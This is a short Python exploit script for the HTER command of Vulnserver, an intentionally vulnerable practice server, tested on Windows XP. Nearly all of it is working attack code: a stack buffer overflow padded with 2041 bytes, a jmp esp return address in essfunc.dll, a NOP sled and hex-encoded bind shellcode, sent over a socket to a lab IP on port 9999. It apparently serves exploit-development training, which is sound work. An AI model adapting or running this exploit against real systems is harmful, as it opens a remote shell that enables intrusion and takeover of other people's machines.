# Exploit for Vulnserver HTER
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

shellcode_bind = "ddc6b8aecb9a94d97424f45d2bc9b15383c50431451303ebd878610f36fe8aefc79f030af69f705fa92ff20d46db56a5dda97eca560759e567349964e447ce46d587038712f5eed5cb715cc978cf5d6232c1e59783e0c4069fbac6a94cb74eb191f2194a61889b9abb7137e373804924b37b3c5cc706479bb5dcc23f1d96759b9f7be36893306736b0c7a44dcc4c4b81441668050ccc111ce8a32e7e531b8bf57e48a65417bd8b66e7a99c15d57637b155fe914699d566d864d696f1a282c66902ab8c69ab7e38610ad15f8cec81df3e85cbef61b5f3250a5e0ec617b687203dd8c1fba91a36344e641c6cf82d76ab07ae5c9b9f25b31fbe399e37d7ae54d69a4f68f34cf3fb988c7ae036db2bd64e89c141f9af1b17c26bc0e4cd728551ea645359b6d00b0c608eede6c278a4558dec31960e6a3ef3f8928faabcad203b49d65cdbb60de5fb54871094c04299f9f2b9de07714b9ff3693e9ab82dd3d6d1dbd345d1c9"

nops = 28 * "90"

cmd      = "HTER "
buffer1  = "A" * 2041
buffer1 += "af115062"   # 0x625011af : jmp esp in essfunc.dll
buffer2  = "C" * (3000-len(buffer1+shellcode_bind+nops))

buffer = cmd + buffer1 + nops + shellcode_bind + buffer2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
